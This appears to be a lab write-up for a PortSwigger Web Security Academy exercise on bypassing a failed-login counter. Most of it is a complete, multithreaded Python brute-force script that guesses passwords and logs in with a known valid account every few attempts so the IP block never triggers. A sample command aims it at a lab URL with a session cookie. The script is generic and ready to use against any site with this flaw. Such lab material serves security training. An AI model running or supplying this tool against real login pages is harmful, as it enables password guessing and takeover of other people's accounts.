# Failed login counter bypass

When a website blocks your IP when you make n failed login attempts, but resets this failed login counter when a successful login is made, this determines a vulnerability that allows to bypass bruteforce protection by making a valid request in-between when probing for passwords. Use the script below:

```bash
import requests
import time
import argparse
from threading import Thread, Lock

# Thread-safe print
print_lock = Lock()
def safe_print(message):
    with print_lock:
        print(message)

def reset_counter(target_url, headers, valid_username, valid_password):
    """Reset the failed attempt counter by logging in successfully."""
    data = {
        "username": valid_username,
        "password": valid_password,
    }
    try:
        response = requests.post(target_url, headers=headers, data=data, allow_redirects=False)
        if response.status_code == 302:  # Successful login usually redirects
            safe_print(f"[+] Counter reset (successful login as {valid_username})")
        else:
            safe_print("[-] Failed to reset counter (check credentials/session)")
    except Exception as e:
        safe_print(f"[-] Reset error: {e}")

def brute_force(target_url, headers, username, password, result):
    data = {
        "username": username,
        "password": password,
    }
    try:
        response = requests.post(target_url, headers=headers, data=data, allow_redirects=False)
        if response.status_code == 302:
            result["found"] = True
            result["credentials"] = f"{username}:{password}"
            safe_print(f"[+] SUCCESS! Credentials: {username}:{password}")
    except Exception as e:
        safe_print(f"[-] Request failed for {username}:{password} | Error: {e}")

def attack_thread(target_url, headers, username, passwords, reset_threshold, valid_username, valid_password):
    for i, password in enumerate(passwords, 1):
        if result.get("found"):
            return

        brute_force(target_url, headers, username, password, result)
        
        # Reset counter after (reset_threshold - 1) attempts
        if i % reset_threshold == 0:
            reset_counter(target_url, headers, valid_username, valid_password)
            time.sleep(1)  # Avoid rate-limiting

def main():
    parser = argparse.ArgumentParser(description="Advanced Brute-Force Tool with Counter Reset")
    parser.add_argument("-u", "--username", help="Single target username (e.g., 'carlos')")
    parser.add_argument("-U", "--userlist", help="File containing list of usernames (one per line)")
    parser.add_argument("-p", "--passlist", required=True, help="File containing password list")
    parser.add_argument("-t", "--threshold", type=int, default=3, help="Reset counter after (n-1) attempts (default: 3)")
    parser.add_argument("-v", "--valid-user", default="wiener", help="Valid username for counter reset")
    parser.add_argument("-P", "--valid-pass", default="peter", help="Valid password for counter reset")
    parser.add_argument("-s", "--session", required=True, help="Session cookie value")
    parser.add_argument("-url", "--target-url", required=True, help="Target login URL")
    args = parser.parse_args()

    # Load usernames
    if args.username:
        usernames = [args.username]
    elif args.userlist:
        with open(args.userlist, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        parser.error("Either --username or --userlist must be specified")

    # Load passwords
    with open(args.passlist, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    # Configure headers
    headers = {
        "Host": args.target_url.split("//")[-1].split("/")[0],
        "Cookie": f"session={args.session}",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36",
    }

    global result
    result = {"found": False, "credentials": None}

    # Start attack threads (one per username)
    threads = []
    for username in usernames:
        thread = Thread(
            target=attack_thread,
            args=(args.target_url, headers, username, passwords, args.threshold, args.valid_user, args.valid_pass)
        )
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    if not result["found"]:
        safe_print("[-] Brute-force completed. No valid credentials found.")

if __name__ == "__main__":
    main()
```

```bash
python brute_limit_bypasser.py -u carlos -p passwords.list -t 2 -v wiener -P peter -url "https://0a0f00f0047dce478063b353002000d7.web-security-academy.net/login" -s "GnLiNMQirz3cxpyIPg6bAUddRLsuml5i"
```

![image.png](Failed%20login%20counter%20bypass%201ea021737a8980d18109e910aa737e73/image.png)